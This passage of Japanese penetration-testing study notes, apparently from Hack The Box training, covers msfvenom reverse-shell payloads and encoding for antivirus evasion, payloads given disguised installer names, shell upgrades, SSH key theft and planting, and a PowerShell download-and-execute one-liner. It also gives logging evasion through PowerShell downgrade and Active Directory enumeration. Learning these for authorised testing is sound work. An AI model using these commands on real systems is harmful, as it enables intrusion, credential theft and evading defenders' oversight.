		- 例 : `windows/meterpreter/reverse_tcp`
	- `_`で機能がまとまっていれば→stageless
		- 例 : `windows/meterpreter_reverse_tcp`

**Windowsの代表的なペイロード**

| ペイロード                           | 説明                                               |
| ------------------------------- | ------------------------------------------------ |
| generic/custom                  | 汎用リスナー、マルチユース                                    |
| generic/shell_bind_tcp          | 汎用リスナー、マルチユース、通常のシェル、TCP接続のバインド                  |
| generic/shell_reverse_tcp       | 汎用リスナー、マルチユース、通常のシェル、リバースTCP接続                   |
| windows/x64/exec                | 任意のコマンドを実行 (Windows x64)                         |
| windows/x64/loadlibrary         | 任意のx64ライブラリパスをロード                                |
| windows/x64/messagebox          | MessageBoxを使用して、タイトル、テキスト、アイコンをカスタマイズ可能なダイアログを生成 |
| windows/x64/shell_reverse_tcp   | 通常のシェル、単一ペイロード、リバースTCP接続                         |
| windows/x64/shell/reverse_tcp   | 通常のシェル、ステージャー＋ステージ、リバースTCP接続                     |
| windows/x64/shell/bind_ipv6_tcp | 通常のシェル、ステージャー＋ステージ、IPv6 Bind TCPステージャー           |
| windows/x64/meterpreter/$       | Meterpreterペイロード＋上記の各種バリエーション                    |
| windows/x64/powershell/$        | 対話型PowerShellセッション＋上記の各種バリエーション                  |
| windows/x64/vncinject/$         | VNCサーバー（反射型インジェクション）＋上記の各種バリエーション                |


### ペイロードの作成
エンコードなし
```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

| **オプション/要素**                     | **役割・説明**                                                                 |
| -------------------------------- | ------------------------------------------------------------------------- |
| `-p linux/x64/shell_reverse_tcp` | ペイロードの指定 : Linux 64ビット向けの“reverse TCP shell”を生成。実行すると、攻撃者側に逆接続してシェルを提供する。 |
| `LHOST=10.10.14.113`             | 攻撃者のIPアドレス: ペイロードが確立しようとする攻撃者（こちら側）のIPアドレス。                               |
| `LPORT=443`                      | 攻撃者のポート番号: ペイロードが接続を試みるポート番号。ここでは443を使用。                                  |
| `-f elf`                         | 出力ファイル形式の指定 : 生成するファイルをLinux向けのELF形式にする。                                  |
| `> createbackup.elf`             | 標準出力のリダイレクト : 作成されたバイナリを`createbackup.elf`として保存する。                        |

### エンコード
エンコーダの役割
- 異なるアーキテクチャへの対応
	- ペイロードを異なるプロセッサアーキテクチャ（x64、x86、SPARC、PPC、MIPSなど）やOS上で動作させるために変換する役割を担っています。
- アンチウイルス（AV）回避
- ペイロード内に含まれる「bad characters」と呼ばれる16進数のオペコードを除去したり、ペイロードを異なるフォーマットにエンコードすることで、アンチウイルスによる検出を回避しやすくします。
	- ※ただし、IPS/IDSメーカーが保護ソフトを進化させたため、AV回避専用のエンコーダーの効果は時間とともに薄れてきています。

Shikata Ga Nai (SGN) について
- 現在最も利用されているエンコーディング方式の一つであるSGNは、かつては検出が非常に困難なため、SGNでエンコードされたペイロードはほぼ検出不可能とされていました。
- 名前「仕方がない」は「どうしようもない」という意味で、数年前にはその通りに感じられたでしょう。しかし、現代ではSGNだけでは万能ではなく、保護システムを回避するために他の手法も検討されています。

shikata_ga_naiでエンコード
```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

| オプション                          | 説明                                        |
| ------------------------------ | ----------------------------------------- |
| `-a x86`                       | アーキテクチャを x86 に指定                          |
| `--platform windows`           | プラットフォームを Windows に指定                     |
| `-p windows/shell/reverse_tcp` | ペイロードとして Windows のシェル（リバースTCP接続）を選択       |
| `LHOST=127.0.0.1`              | 攻撃者側（リスナー）のIPアドレスを 127.0.0.1 に設定          |
| `LPORT=4444`                   | 攻撃者側（リスナー）のポート番号を 4444 に設定                |
| `-b "\x00"`                    | ペイロードから除外するバッドキャラクターとして NULL を指定          |
| `-f perl`                      | 出力形式を Perl スクリプト形式に指定                     |
| `-e x86/shikata_ga_nai`        | エンコーダーとして x86/shikata_ga_nai を使用（エンコード処理） |

エンコードなし
```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

#### AVの回避
最近のAVでは、それぞれのエンコードを一回行っても全然検知されてしまう
- 1つの簡単なAV回避の方法は、同じエンコーディングを反復してエンコードしてみること
	- でも全然回避できないことが多いから、他の方法を使ったほうがいい
```shell-session
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```
- Metasploitは、APIキーでペイロードを分析することができる`msf-virustotal`と呼ばれるツールを提供しているから、それで確認して、AVの回避を向上させるのも面白いかもしれない
	- VirusTotalへの無料登録が必要
こんな感じで使えるらしい
```shell-session
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

### 実行手順の流れ
1. 攻撃者が `msfvenom` コマンドでペイロードを生成（`createbackup.elf`）
2. 攻撃者側がリスナーを開いて待ち受けておく
	- `sudo nc -lvnp 443`
3. ターゲットにいずれかの方法でダウンロードさせる
##### Linux・Windows共通
- ファイル添付メール
- ウェブサイトのダウンロードリンク
- Metasploitエクスプロイトモジュールと組み合わせる（これはおそらく、すでに内部ネットワーク上にいる必要があります）。
- オンサイト侵入テストの一環として、フラッシュドライブを介して。
##### Windows
- Impacket
	- ネットワーク プロトコルと直接対話する方法を提供する Python の組み込みツールセット
	- `psexec`、`smbclient`、`wmi`、Kerberos、およびSMBサーバーをスタンドアップする能力を扱っているコマンド
- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): は、ホスト間でファイルを便利に転送するのに役立つ迅速なワンライナーを見つけるための優れたリソース
- SMB
	- 被害者のホストがドメインに参加し、共有を利用してデータをホストする場合に特に便利
	- 攻撃者として、これらのSMBファイル共有を`C$`と`admin$`とともに使用して、ペイロードをホストして転送し、リンクを介してデータを流出させることさえできた
- `Remote execution via MSF`
	- Metasploitの多くのエクスプロイトモジュールに組み込まれているのは、ペイロードを自動的に構築、ステージング、実行する関数
- 他のプロトコル
	- ホストを見ると、FTP、TFTP、HTTP/Sなどのプロトコルは、ホストにファイルをアップロードする方法をがあるかも
	- オープンで使用できる機能を列挙して探そう！

4. ターゲットで `createbackup.elf` を実行（適宜権限を付与し実行）
5. 実行されたプログラムが `LHOST` : `LPORT` へ接続
6. ncで待ち受けていた攻撃者側がシェルを取得できる
- Windowsでは、`encoding`や`encryption`がなければ、この形式のペイロードはほぼ確実にWindows Defender AVによって検出される
- BonusCompensationPDF.exeなんだけど、一般の人はあんまり拡張子をつけないから実行できるとかね

### Windowsファイル形式
 ペイロードの時、どのファイルを選んだらいいの？
- **DLL (Dynamic Link Library)**
    - **Microsoft OS で使用されるライブラリファイル**
    - 複数のプログラムで同時に利用可能な**共有コードとデータ**を提供
    - モジュール化されたアプリケーション構成を可能にし、**アップデートやメンテナンスが容易**
    - **ペンテスター視点**: 悪意ある DLL の注入やライブラリのハイジャックにより、**SYSTEM 権限昇格**や**UAC (ユーザーアカウント制御) のバイパス**を狙える
- **バッチ (Batch) ファイル**
    
    - **テキストベースの DOS スクリプト** (`.bat`)
    - コマンドラインインタプリタを介して**複数のタスクを自動実行**
    - システム上でのコマンド実行を容易にし、ポートを開く・攻撃者側への接続などの仕掛けが可能
    - **ペンテスター視点**: 基本的な列挙を実行させたり、オープンポート経由で情報を取得するなど、自動化に利用
- **VBS (VBScript)**
    
    - **Microsoft Visual Basic ベース**の軽量スクリプト言語
    - もともと**動的なウェブページ用** (クライアントサイドスクリプト) として利用されていた
    - **最新ブラウザでは非推奨・無効**が多い
    - **ペンテスター視点**: フィッシングや Excel マクロなど、**ユーザーの操作を誘導**してコードを Windows スクリプトエンジンで実行させる手口で依然活用される
- **MSI (.msi ファイル)**
    
    - **Windows インストーラーのインストールデータベース**として機能
    - 新しいアプリをインストールする際、`.msi` ファイルを参照して必要コンポーネントを取得
    - **ペンテスター視点**: ペイロードを `.msi` 化することで **Windows インストーラー**を利用し、`msiexec` コマンドで実行可能
    - インストール後に**昇格権限のリバースシェル**などを得ることができる
- **PowerShell**
    
    - **シェル環境 + スクリプト言語** (Microsoft OS での最新シェル)
    - **.NET Common Language Runtime** 上で動作し、**.NETオブジェクト**を入出力として扱う
    - **ペンテスター視点**: シェルの取得やホスト上でのスクリプト実行など、**侵入テストで幅広く活用**できる多数のオプションを提供

 CMDとPSどっちのターミナル言語使えばいいの？

  CMD を使用する場合
- 古いホストで PowerShell が含まれていない可能性があるとき
- ホストに対してシンプルな操作やアクセスだけが必要なとき
- シンプルなバッチファイル、net コマンド、または MS-DOS ネイティブツールを使用する予定のとき
- スクリプトやその他のアクションの実行に影響する可能性がある実行ポリシーを回避したいとき

PowerShell を使用する場合
- Cmdlet やその他の独自スクリプトを活用する予定のとき
- テキスト出力ではなく .NET オブジェクトとして操作したいとき
- ステルス性がさほど重要でないとき
- クラウドベースのサービスやホストとやり取りする予定のとき
- スクリプト内でエイリアス（Aliases）を設定・使用するとき

##### 侵入口としてのWSL
- **WSL（Windows Subsystem for Linux）**
    - ホストに組み込まれた仮想 Linux 環境を提供
    - OS の急速な変化に伴い、新たなホストアクセス手法を可能にする可能性
    - Python3 と Linux バイナリを利用して、WSL を介し Windows ホストにペイロードをダウンロード・インストールするマルウェアが確認されている
    - 攻撃者は Windows と Linux 双方にネイティブな Python ライブラリを使い、PowerShell と組み合わせてホスト上で別のアクションを実行
    - **WSL インスタンスとの通信（ネットワーク要求や機能）は Windows ファイアウォールや Windows Defender で解析されず、ホストの死角となる**
- **PowerShell Core**
    - Linux オペレーティングシステム上にもインストール可能
    - 多くの通常の PowerShell 機能を引き継いでいる
    - 攻撃ベクトルや監視手法がまだ十分に知られていないため、潜在的に卑劣な手段として利用されうる
    - AV や EDR の検出メカニズムを回避する目的で使用される事例がある

### ファイアーウォールとIDS/IPS回避
- https://academy.hackthebox.com/module/39/section/416


## DatabaseMsfconsoleについて
- スキャン結果、エントリーポイント、検出された脆弱性、収集された資格情報などの情報を整理・管理するために使える
- msfconsoleではPostgreSQLが使用され、結果のインポートやエクスポートも可能
なんか今のところあんまり使いたい意欲ないから、使いたくなったら、ここに詳しく書いてあるよ
- https://academy.hackthebox.com/module/39/section/411


## Pluginについて
なんか今のところあんまり使いたい意欲ないから、使いたくなったら、ここに詳しく書いてあるよ
- https://academy.hackthebox.com/module/39/section/413
- プラグイン作るとかだったら面白そうと思うんだけどね

## セッション管理
- Meterpreterは繋げるまま、一旦Meterpreterから抜ける
```sh
background
```

- セッション一覧表示

```bash
sessions -l
```

- セッション接続・セッションに戻る

```bash
sessions -i <セッション番号>
```

- セッション全終了

```bash
sessions -K
```

### 特権昇格の発見とエクスプロイト

Mesterpreterでユーザー権限でセッションが確立している時、ターゲットシステムに適した特権昇格エクスプロイトを提案させることができる
```bash
use post/multi/recon/local_exploit_suggester
set SESSION <セッション番号>
run
```


# シェルアップデート
- linux
	- python3 -c 'import pty; pty.spawn("/bin/bash")'
	- /bin/sh -i
	- perl —e 'exec "/bin/sh";'
	- awk 'BEGIN {system("/bin/sh")}'
	- `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}';`
	- `find . -exec /bin/sh ; -quit`
	- vim -c ':!/bin/sh'
	- 以下は、スクリプトで書いて実行する必要がある
		- perl: exec "/bin/sh";
		- ruby: exec "/bin/sh"
		- lua: os.execute('/bin/sh')
Vimのセッション内でもできる
```shell-session
vim
:set shell=/bin/sh
:shell
```

- windows
- 方法 : rlwrap は、コマンドラインの入力履歴や補完機能を提供するラッパープログラムです。これを nc と組み合わせることで、シェルの機能を強化できます。

```bash
sudo apt update
sudo apt install rlwrap
rlwrap nc -lvnp <ポート番号>  # リスナー側 (攻撃者マシン)
```

# 横展開

## Linux
リバースシェルで、ログインした時、最初は、「www-data」であることがある。
その時、www-dataのパスワードがわからないので横展開が必要

- データベース情報を書き換える・新規追加
	- ローカルの空いてるポート見つけるコマンド
		- `netstat -tuln`
	- データベースの種類を見分ける方法
		- **ポート番号3306**は、MySQLまたはMariaDBのデフォルトポート
		- **ポート番号:5432**:PostgreSQL

- HTBでの認証情報の使い回し
	- webのログインで取得したパスワードとサーバー上のユーザーが同じことがある
	- DBの設定ファイルにあるパスワードとsshのパスワードが同じ

- **`/etc/passwd` から有効なシェルを持つユーザーの確認**
	- `/etc/passwd` の最後のフィールドは、**そのユーザーのデフォルトシェル** を示している。  
	- `/bin/bash` ・`/bin/sh`
		-  ユーザーは、**通常のログインが可能**。
		- 横展開先のユーザーに最適
	- **`/usr/sbin/nologin`**
	    - このシェルが設定されているユーザーは、**ログインできない** ように制限されている。
	    - 例えば、`www-data` や `mysql` などのシステムユーザーに設定されている。
	- **`/bin/false`**
	    - これもログインを拒否するための設定。
	    - `false` コマンドは何もせず終了するため、**ログインを試みても即ログアウトする**。
	横展開先のユーザーを探す時に使える。

### ディレクトリトラバーサル
- 以下のリンクのディレクトリトラバーサル試していく
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md#path-traversal
- [[Web Server Side Attack#LFIスキャンの流れ]]

## ピポット・トンネリング・ポートフォワーディング
[[Pivoting・Tunneling ・Port Forwarding]]

# 権限昇格
- 現在のユーザーで、sudo コマンドを使用して実行可能なコマンドや権限を確認する
```bash
sudo -l
```
- 正直HTBのEasyとかMediumの一部では、このコマンド打って、NoPasswordって書いてあるスクリプトをsudo権限で実行すれば権限昇格できる。

- ここにまとまってるから、あとでまとめる
	- https://scrapbox.io/tadanomemo777/Linux_%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC

### 権限昇格で使えるチェックリスト
- [HackTricks](https://book.hacktricks.xyz/) 
	- [Linux](https://book.hacktricks.wiki/ja/linux-hardening/linux-privilege-escalation-checklist.html) と [Windows](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html) の両方のローカル特権の昇格に関する優れたチェックリスト
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) 
	- [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) と [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) の両方のチェックリストがある

### 自動列挙ツール
- 上記のコマンドの多くは、レポートを調べて弱点を探すためにスクリプトで自動的に実行される場合がある
- 興味深い結果を返す一般的なコマンドを実行することで、多くのスクリプトを実行してサーバーを自動的に列挙できる
- 一般的な Linux 列挙スクリプトには、[LinEnum](https://github.com/rebootuser/LinEnum.git) と [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) があり、Windows には [Seatbelt](https://github.com/GhostPack/Seatbelt) と [JAWS ](https://github.com/411Hall/JAWS)がある。
- [Privilege Escalation Awesome Scripts SUITE（PEASS）](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
	- 最新の状態に保つために適切に維持されており、LinuxとWindowsの両方を列挙するためのスクリプトが含まれている
しかし、自動列挙ツールはウイルス対策ソフトウェアまたはセキュリティ監視ソフトウェアをトリガーする可能性のある多くの「ノイズ」を生成するので、スクリプトの実行が妨げられたり、システムが侵害されたというアラームがトリガーされたりする可能性がある。場合によっては、スクリプトを実行する代わりに手動列挙を実行する必要がある。

これらのスクリプトの出力で、探すべき脆弱性
- カーネルエクスプロイト
	- 普通にバージョンが古いOSだと、パッチが当たってないから、脆弱性になりうる
- 脆弱なソフトウェア
	- linux : `dpkg -l`
		- インストールされているソフトウェアが、古いバージョンの時、脆弱性がある場合がある。
	- Windows : `C:\Program Files`以下を見る
- ユーザー権限
	- Sudo
		- `sudo -l`
			- (ALL : ALL) ALL 
				- `sudo`ですべてのコマンドを実行でき、完全なアクセス権を与え、`sudo`で`su`コマンドを使用してルートユーザーに切り替えることができると述べています。
			- (user : user) NOPASSWD: /bin/echo
				- `sudo`でコマンドを実行するにはパスワードが必要です。特定のアプリケーション、またはすべてのアプリケーションをパスワードなしで実行できる場合があり
	- SUID
		- SUID バイナリ (Set User ID) を検索して一覧表示する
		- `find / -type f -perm -04000 -ls 2>/dev/null`
	- Windows Token Privileges
		-  GTFOBins : https://gtfobins.github.io
		- Windows版 GTFOBins : https://lolbas-project.github.io/#


スケジュールされたタスク
- スケジュールされたタスク（Windows）またはcronジョブ（Linux）を利用して特権をエスカレーションするには、通常2つの方法があります。
	- 新しいスケジュールされたタスク/cronジョブを追加する
	- 悪意のあるソフトウェアを実行するように彼らをだます
	- 新しいスケジュールされたタスクを追加できるかどうかを確認する
		- /etc/crontab
		- /etc/cron.d
		- /var/spool/cron/crontabs/root
		- cronジョブによって呼び出されたディレクトリに書き込むことができれば、実行時にリバースシェルを送信するリバースシェルコマンドでbashスクリプトを記述できる

SSHキー
- 特定のユーザーの .ssh を読み取れるアクセス権がある場合
	- 以下のプライベート ssh キーを参照・コピー
		- `cat /root/.ssh/id_rsa`
		- `cat /user1/.ssh/id_rsa`
	- ローカルにペースト・権限を与える
		- `nano id_rsa`
		- `chmod 600 id_rsa`
	- ローカルから接続
		- `ssh root@94.237.53.117 -p 53658 -i id_rsa`

ユーザー`/.ssh/`ディレクトリへの書き込みアクセス権がある場合
- ユーザーのsshディレクトリの/home/user/.ssh/authorized_keysに公開鍵を配置
- 出力ファイルを指定するには、まず ssh-keygen と -f フラグで新しいキーを作成する
```shell-session
#攻撃者PC
ssh-keygen -f key
```
- `key`（`ssh -i`で使用します）と`key.pub`の2つのファイル
- `key.pub`をコピーして、リモートマシンで`/root/.ssh/authorized_keys`に追加
- 被害者PCで実行
```shell-session
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```
- これで、リモートサーバーは、秘密鍵を使用してそのユーザーとしてログインできるはず
```shell-session
snowyowl644@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost# 
```


## LOLBANS
Living Off the Landで使うための辞書的存在
- 環境にあるものだけでやりくりする
	- つまり、Windows/Active Directoryに標準で備わっているツールやコマンドだけを使う手法に頼らざるを得ない
- また、他のツールを使うことで、アラートも少なくなる可能性がある
	- IPS/IDSなどが、通常の通信とは異なる通信ということでアラートが出るようになっている可能性もあるため

LOLBANSについてまとめているサイト
- Windows
	- https://lolbas-project.github.io
- Linux
	- https://gtfobins.github.io/

その他、使えるコマンド
### Windows
Powershell上で実行
#### 基本的な列挙

| **コマンド**                                                                                   | **結果**                                                                                 |
| ------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------- |
| hostname                                                                                   | PCの名前を表示する                                                                             |
| [System.Environment]::OSVersion.Version                                                    | OSのバージョンとリビジョンレベルを表示する                                                                 |
| wmic qfe get Caption,Description,HotFixID,InstalledOn                                      | ホストに適用されているパッチやホットフィックスの一覧を表示する                                                        |
| ipconfig /all                                                                              | ネットワークアダプターの状態と構成を表示する                                                                 |
| set                                                                                        | 現在のセッションでの環境変数一覧を表示する（CMDプロンプトから実行）                                                    |
| echo %USERDOMAIN%                                                                          | ホストが所属しているドメイン名を表示する（CMDプロンプトから実行）                                                     |
| echo %logonserver%                                                                         | ホストがチェックインしているドメインコントローラーの名前を表示する（CMDプロンプトから実行）                                        |
| **systeminfo**                                                                             | 上のコマンド達の結果をこのコマンドで表示できる                                                                |
| Get-Module                                                                                 | 使用可能な（ロードされている）モジュールの一覧を表示                                                             |
| Get-ExecutionPolicy -List                                                                  | ホスト上の各スコープごとの実行ポリシー設定を表示                                                               |
| Set-ExecutionPolicy Bypass -Scope Process                                                  | -Scope パラメータを使用して、現在のプロセスだけに実行ポリシーを一時的に変更する。このプロセスを終了すると元に戻るため、ホストに恒久的な変更を加えずに済む       |
| `Get-ChildItem Env:\| ft Key,Value`                                                        | 環境変数（キーと値のペア）を一覧表示し、パス、ユーザー名、コンピュータ情報などを取得                                             |
| Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   | 特定ユーザーのPowerShellコマンド履歴を取得します。この履歴にはパスワードや、パスワードが含まれる設定ファイル／スクリプトの手がかりがある場合もあるため、有用です。 |
| powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('ダウンロード元のURL'); <続くコマンド>" | Web上からファイルをダウンロードして、メモリ上で実行するためのシンプルかつ迅速な方法です。                                         |
#### 運用上のセキュリティ戦術

Powershellのダウングレード
- ディフェンス側は、1台のホストに複数バージョンのPowerShellが存在している可能性があることに気づいていないことがある
	- アンインストールされていなければ、古いバージョンも依然として使用可能
	- PowerShellの**イベントログ記録機能は、PowerShell 3.0以降で導入された**機能
	- 逆に、PowerShell 2.0以前のバージョンを呼び出すことができれば、そのシェル上での操作はEvent Viewer（イベントビューア）に記録されない
	- **ディフェンダーの監視の目をかいくぐる**ための優れた方法の一つ
Powershellをダウングレードするコマンド
```sh
powershell.exe -version 2
```

本当にダウングレードできているのか
- ダウングレードする前とダウングレードした後に`Get-Host`コマンドを打って、出力結果の`Version`の部分を見る
- ダウングレードした後のVersionが2.0になっていなければOK

本当にログが記録されていないか
- PowerShell Operationalログ
	- 場所：`Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`
	- → ここには、セッション内で実行されたすべてのコマンドが記録されるはずなので、ここに記録されていなければ大丈夫
- Windows PowerShellログ
	- 場所：`Applications and Services Logs > Windows PowerShell`
	- → PowerShellを起動したときに、そのインスタンスがログとして記録されるので、ここに記録されていなければ大丈夫
- 注意点
	- PowerShellセッション内で powershellのダウングレードを実行したという操作自体はログに記録される

#### 防御機構の確認
Windowsファイアーウォールの設定状態や、稼働状況を確認する

ファイアーウォールの確認
- 全てのファイアーウォールプロファイル(ドメイン・プライベート・パブリック)に関する設定情報が表示できる
```sh
PS C:\htb> netsh advfirewall show allprofiles
```

Windows Defenderの確認
cmd.exeで実行
- STATEの部分に注目する
```sh
C:\htb> sc query windefend
```

Defender の詳細なステータスや構成設定を確認する
```sh
PS C:\htb> Get-MpComputerStatus
```

**自分以外に誰かログインしていないか**
- 自分以外もログインしていた場合、ポップアップウィンドウが出たり、強制ログアウトさせられることがある
- なので、まず侵入した時は自分以外に誰かログインしていないかを確認する
```powershell-session
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen
```
STATEの見方

| STATE                  | 意味                          | 誰かログインしてる？ | 補足                        |
| ---------------------- | --------------------------- | ---------- | ------------------------- |
| **Active**             | セッションが**アクティブ（操作中）**        | ✅ はい       | ユーザーが現在ログイン＆使ってる状態        |
| **Disc**（Disconnected） | セッションが**切断された**（ログイン中だが未使用） | ✅ はい       | RDP切断後とか。まだメモリ上にセッションはある  |
| **Listen**             | セッション待機中（**接続待ち状態**）        | ❌ いいえ      | 誰もログインしてないが、RDP接続を待っている状態 |
| **Idle**               | 放置状態（Activeのまま時間が経過）        | ✅ はい       | 実際はActiveと同じ扱いになることもある    |
類似コマンド
- Windows環境で現在ログインしているユーザーのセッション情報を一覧表示するコマンド
```sh
query user
```

#### ネットワーク情報
- 現在のホストが把握している他のホストやネットワークを表示する
- ルーティングテーブルに表示されるネットワーク
	- ホストが頻繁にアクセスしているか、もしくは管理者によってルートが明示的に設定されている
	- つまり、そのネットワーク上にあるドメインのリソースにアクセスする手段を知っているということ

これらのコマンドは、ブラックボックス型の探索フェーズで役にたつ
パッシブな情報収集手段として非常に有効
**AD環境の列挙に役立つだけでなく、他のネットワークセグメントへのピボット（横展開）機会を見つける助け**にもなる

| **ネットワーク系コマンド**                    | **説明**                                                          |
| ---------------------------------- | --------------------------------------------------------------- |
| arp -a                             | ARPテーブルに記録されている既知のホスト一覧を表示                                      |
| ipconfig /all                      | ホストのネットワークアダプタ設定を出力する。ネットワークセグメントを把握できる                         |
| route print                        | ルーティングテーブル（IPv4 & IPv6）を表示する。ホストが認識しているネットワークやレイヤー3のルート情報が確認できる |
| netsh advfirewall show allprofiles | ホストのファイアウォールの状態を表示する。アクティブかどうか、トラフィックをフィルタリングしているかなどを確認できる      |
#### WMI
- WMI : Windows Management Instrumentationは、Windowsの企業環境で広く使われているスクリプトエンジン
- ローカルおよびリモートのホストに対して、情報の取得や管理タスクの実行を行うことができる
PowerShellで実行する

| **コマンド**                                                                               | **説明**                                               |     |
| -------------------------------------------------------------------------------------- | ---------------------------------------------------- | --- |
| wmic qfe get Caption,Description,HotFixID,Installed                                    | ホストに適用されているパッチやホットフィックスの概要と適用日時を表示する                 |     |
| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:L        | ホストに関する基本情報（ホスト名、ドメイン、製造元、モデル、ユーザー名、役割など）を表示する       |     |
| wmic process list /format:                                                             | ホスト上で実行中のすべてのプロセスの一覧を表示する                            |     |
| wmic ntdomain list /format                                                             | ドメインおよびドメインコントローラーに関する情報を表示する                        |     |
| wmic useraccount list /forma                                                           | ホスト上のすべてのローカルアカウント、ならびに過去にログインしたドメインアカウントに関する情報を表示する |     |
| wmic group list /form                                                                  | すべてのローカルグループに関する情報を表示する                              |     |
| wmic sysaccount list /for                                                              | サービスアカウントとして使用されているシステムアカウントに関する情報を出力する              |     |
| wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress | **現在のドメインが信頼関係を持つドメインや子ドメイン、外部フォレスト**に関する情報を取得       |     |

#### ドメインからの列挙
- ドメインから情報を列挙（enumerate）する際に非常に役立つツール
- ローカルホストおよびリモートホストの両方に対してクエリを実行することができ、機能的には WMI と似たような使い方ができる
	- ローカルおよびドメインユーザー
	- グループ
	- ホストの一覧
	- 特定グループに所属するユーザー
	- ドメインコントローラー
	- パスワードポリシーな度がわかる
注意点
- net.exe を使ったコマンドは EDR（Endpoint Detection and Response）によって監視されていることが多いので、バレたり、ブロックされる可能性も全然ある
- でも`net`の代わりに`net1`を使うことで、netと同じことをすることができる
	- `net1`は、互換性のために残されているコマンドで、アラートとかに乗っかりにくいかもしれない


| **コマンド**                                   | **説明**                                              |
| ------------------------------------------ | --------------------------------------------------- |
| net accounts                               | パスワードの要件に関する情報                                      |
| net accounts /domain                       | パスワードとアカウントロックアウトのポリシー                              |
| **net group /domain**                      | ドメイングループに関する情報                                      |
| net group "Domain Admins" /domain          | ドメイン管理者権限を持つユーザーの一覧                                 |
| net group "domain computers" /domain       | ドメインに参加しているPCの一覧                                    |
| net group "Domain Controllers" /domain     | ドメインコントローラーのPCアカウント一覧                               |
| net group <グループ名> /domain                  | 指定したグループに所属しているユーザー                                 |
| net groups /domain                         | ドメイングループの一覧                                         |
| net localgroup                             | 使用可能なローカルグループの一覧                                    |
| net localgroup administrators /domain      | ドメイン内の管理者グループに所属するユーザー一覧（※通常 “Domain Admins” も含まれる） |
| net localgroup Administrators              | ローカル「Administrators」グループの情報                         |
| net localgroup administrators [ユーザー名] /add | 指定ユーザーを Administrators グループに追加                      |
| net share                                  | 現在の共有フォルダの確認                                        |
| net user <アカウント名> /domain                  | ドメイン内の特定ユーザーの情報取得                                   |
| net user /domain                           | ドメイン内のすべてのユーザーを一覧表示                                 |
| net user /domain <ユーザーネーム>                 | ドメイン内のユーザーの詳細情報を表示する                                |
| net user %username%                        | 現在ログインしているユーザーの情報                                   |
| net use x: \\コンピュータ名\共有名                   | 指定された共有をローカルにマウント                                   |
| net view                                   | コンピュータの一覧取得                                         |
| net view /all /domain[:ドメイン名]              | ドメイン内のすべての共有リソース一覧                                  |
| net view \\コンピュータ名 /ALL                    | 指定したコンピュータの共有リソース一覧                                 |
| net view /domain                           | ドメイン内のPC一覧                                          |

##### Dsquery
- Active Directory オブジェクトを検索するための便利なコマンドラインツール
- このツールで実行するクエリは、BloodHound や PowerView といった他のツールでも再現可能ですが、常にそういったツールを利用できるとは限らない
- Active Directory Domain Services のロールがインストールされているホストには dsquery が存在していることがある
	- dsquery.dll は最新のWindows環境であればデフォルトで`C:\Windows\System32\dsquery.dll`に存在する
- Dsquery DLLについて
	- dsquery を使用するには、ホスト上で昇格権限（管理者権限）を持っているか、SYSTEMコンテキストでコマンドプロンプトやPowerShellを実行できる必要がある

ユーザー検索
```powershell-session
PS C:\htb> dsquery user
```

ホストの検索
```powershell-session
PS C:\htb> dsquery computer
```

ワイルドカードを使った検索
```powershell-session
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

LDAP検索フィルターと組み合わせて、より詳細で条件を絞った検索を行うことができる
**userAccountControl 属性に PASSWD_NOTREQD（パスワード不要）フラグが設定されたユーザー**を検索するコマンド
```sh
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
